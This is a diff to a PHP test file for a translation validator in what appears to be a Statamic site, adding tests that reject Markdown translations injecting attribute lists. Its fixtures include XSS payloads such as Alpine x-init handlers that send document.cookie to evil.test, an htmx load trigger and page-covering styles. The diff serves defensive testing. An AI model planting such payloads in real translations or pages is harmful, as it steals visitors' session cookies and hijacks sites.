@@ -553,9 +553,32 @@ describe('model output', function () {
         'a changed bare address' => 'Διαβάστε [την ιστορία μας](<x1/>) στο www.kyma-evil.test.',
     ]);
 
-    it('delivers and saves the source text instead of a translation that keeps adding markup', function () {
+    // CommonMark's attribute lists, which Statamic's Markdown parser renders: it drops only on* attributes, so Alpine's
+    // x-init and x-on:, htmx's hx-*, style and class reach the page. The source's own lists are atoms.
+    it('rejects a Markdown translation that adds an attribute list', function (string $source, string $translation) {
+        expect(app(SegmentValidator::class)->validate(['text' => $source, 'kind' => 'markdown'], $translation))
+            ->toMatch('/\b[Ii]t adds an attribute list or a curly brace \(\{…\}\)/u');
+    })->with([
+        'x-init on an inline element' => ['Breakfast is served *every day* on [the terrace](<x1/>).', 'Το πρωινό σερβίρεται *κάθε μέρα*{x-data="" x-init="fetch(\'//evil.test/\'+document.cookie)"} στη [βεράντα](<x1/>).'],
+        'an x-on: handler' => ['Breakfast is served *every day* on [the terrace](<x1/>).', 'Το πρωινό σερβίρεται *κάθε μέρα*{x-on:click="fetch(\'//evil.test\')"} στη [βεράντα](<x1/>).'],
+        'a style' => ['Breakfast is served *every day* on [the terrace](<x1/>).', 'Το πρωινό σερβίρεται *κάθε μέρα* στη [βεράντα](<x1/>){style="position:fixed;inset:0;z-index:99"}.'],
+        'a class list' => ['Breakfast is served *every day* on [the terrace](<x1/>).', 'Το πρωινό σερβίρεται *κάθε μέρα*{.fixed .inset-0} στη [βεράντα](<x1/>).'],
+        'an unquoted htmx attribute' => ['Breakfast is served *every day* on [the terrace](<x1/>).', 'Το πρωινό σερβίρεται *κάθε μέρα* στη [βεράντα](<x1/>){hx-get=/evil hx-trigger=load}.'],
+        'spaces around the equals sign' => ['Breakfast is served *every day* on [the terrace](<x1/>).', 'Το πρωινό σερβίρεται *κάθε μέρα*{ x-init = go() } στη [βεράντα](<x1/>).'],
+        'a value holding braces' => ['Breakfast is served *every day* on [the terrace](<x1/>).', 'Το πρωινό σερβίρεται *κάθε μέρα*{x-data="{ a: fetch(\'//evil.test\') }"} στη [βεράντα](<x1/>).'],
+        'a Kramdown colon' => ['Breakfast is served *every day* on [the terrace](<x1/>).', 'Το πρωινό σερβίρεται *κάθε μέρα*{: x-init="go()"} στη [βεράντα](<x1/>).'],
+        'on a heading' => ['## Breakfast every day', '## Πρωινό κάθε μέρα {x-init="go()"}'],
+        'on its own line before the block' => ['Breakfast is served every day.', "{x-init=\"go()\"}\nΤο πρωινό σερβίρεται κάθε μέρα."],
+        'on its own line after the block' => ['Breakfast is served every day.', "Το πρωινό σερβίρεται κάθε μέρα.\n{x-init=\"go()\"}"],
+        'on a list item' => ['- Breakfast every day', '- Πρωινό κάθε μέρα {x-init="go()"}'],
+        'appended to a source list' => ['Read [our story](<x1/>)<x2/> today.', 'Διαβάστε [την ιστορία μας](<x1/>)<x2/> x-init=go()} σήμερα.'],
+        'made of the source\'s own braces' => ['Pick a number from {1, 2} today.', 'Διαλέξτε {x-init=go()} έναν αριθμό από 1, 2 σήμερα.'],
+        'closed by a placeholder' => ['Pick {1, 2} or *this*<x1/>.', 'Διαλέξτε {x-init=go();//<x1/> 1, 2 ή *αυτό*.'],
+    ]);
+
+    it('delivers and saves the source text instead of a translation that keeps adding markup', function (string $markdown) {
         $this->fakeTranslations(fn (string $text, array $segment) => $segment['kind'] === 'markdown'
-            ? '[Η ιστορία μας](https://evil.test)'
+            ? $markdown
             : $text.' <script>alert(1)</script>');
         $this->signInAdmin();
 
@@ -571,13 +594,17 @@ describe('model output', function () {
             'intro' => 'A short intro.',
             'body' => 'Read [our story](https://kyma.test/story).',
         ])
-            ->and(collect($responses)->map->getContent()->implode(''))->not->toContain('<script')->not->toContain('evil.test')
+            ->and(collect($responses)->map->getContent()->implode(''))->not->toContain('<script')->not->toContain('evil.test')->not->toContain('x-init')
             ->and($german->data()->only(['title', 'intro', 'body'])->all())->toBe([
                 'title' => 'Hello',
                 'intro' => 'A short intro.',
                 'body' => 'Read [our story](https://kyma.test/story).',
-            ]);
-    });
+            ])
+            ->and((string) $german->augmentedValue('body'))->toContain('<a href="https://kyma.test/story">our story</a>')->not->toContain('x-init');
+    })->with([
+        'a link' => '[Η ιστορία μας](https://evil.test)',
+        'an attribute list' => 'Διαβάστε [την ιστορία μας](<x1/>){x-data="" x-init="fetch(\'//evil.test/\'+document.cookie)"}.',
+    ]);
 });
 
 it('never renders HTML from data in the Control Panel scripts', function () {
